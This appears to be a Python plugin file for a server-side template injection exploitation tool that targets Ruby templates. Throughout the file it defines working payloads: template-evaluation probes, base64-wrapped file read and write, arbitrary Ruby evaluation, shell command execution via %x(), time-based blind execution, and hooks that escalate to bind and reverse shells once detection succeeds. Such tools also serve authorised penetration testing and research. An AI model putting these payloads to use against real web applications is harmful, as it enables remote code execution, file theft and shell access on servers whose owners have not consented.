from utils.strings import quote
from core.plugin import Plugin
from core import languages
from utils.loggers import log
from utils import rand
import base64
import re

class Ruby(Plugin):

    actions = {
        'render' : {
            'render': '"#{%(code)s}"',
            'header': """'%(header)s'+""",
            'trailer': """+'%(trailer)s'""",
            'render_test': """%(s1)i*%(s2)i""" % { 
                's1' : rand.randints[0], 
                's2' : rand.randints[1]
            },
            'render_expected': '%(res)s' % { 
                'res' : rand.randints[0]*rand.randints[1]
            }
        },
        'write' : {
            'call' : 'inject',
            'write': """require'base64';File.open('%(path)s', 'ab+') {|f| f.write(Base64.urlsafe_decode64('%(chunk_b64)s')) }""",
            'truncate' : """File.truncate('%(path)s', 0)"""
        },
        'read' : {
            'call': 'evaluate',
            'read': """(require'base64';Base64.encode64(File.binread("%(path)s"))).to_s""",
        },
        'md5' : {
            'call': 'evaluate',
            'md5': """(require'digest';Digest::MD5.file("%(path)s")).to_s"""
        },
        'evaluate' : {
            'call': 'render',
            'evaluate': """%(code)s"""
        },
        'execute' : {
            'call': 'evaluate',
            'execute': """(require'base64';%%x(#{Base64.urlsafe_decode64('%(code_b64)s')})).to_s"""
        },
        'blind' : {
            'call': 'evaluate_blind',
            'bool_true' : """1.to_s=='1'""",
            'bool_false' : """1.to_s=='2'"""
        },
        'evaluate_blind' : {
            'call': 'inject',
            'evaluate_blind': """require'base64';eval(Base64.urlsafe_decode64('%(code_b64)s'))&&sleep(%(delay)i)"""
        },
        'bind_shell' : {
            'call' : 'execute_blind',
            'bind_shell': languages.bash_bind_shell
        },
        'reverse_shell' : {
            'call': 'execute_blind',
            'reverse_shell' : languages.bash_reverse_shell
        },
        'execute_blind' : {
            'call': 'inject',
            'execute_blind': """require'base64';%%x(#{Base64.urlsafe_decode64('%(code_b64)s')+' && sleep %(delay)i'})"""
        },
    }

    contexts = [

        # Text context, no closures
        { 'level': 0 },
        
        # Code context escape with eval() injection is not easy, since eval is used to evaluate a single 
        # dynamically generated Python expression e.g. eval("""1;print 1"""); would fail. 
        
        # TODO: the plugin should support the exec() injections, which can be assisted by code context escape

    ]

    language = 'ruby'

    def rendered_detected(self):

        os = self.evaluate("""RUBY_PLATFORM""")
        if os and re.search('^[\w._-]+$', os):
             self.set('os', os)
             self.set('evaluate', self.language)
             self.set('write', True)
             self.set('read', True)
         
             expected_rand = str(rand.randint_n(2))
             if expected_rand == self.execute('echo %s' % expected_rand):
                 self.set('execute', True)
                 self.set('bind_shell', True)
                 self.set('reverse_shell', True)


    def blind_detected(self):

        # Blind has been detected so code has been already evaluated
        self.set('evaluate_blind', self.language)

        if self.execute_blind('echo %s' % str(rand.randint_n(2))):
             self.set('execute_blind', True)
             self.set('write', True)
             self.set('bind_shell', True)
             self.set('reverse_shell', True)
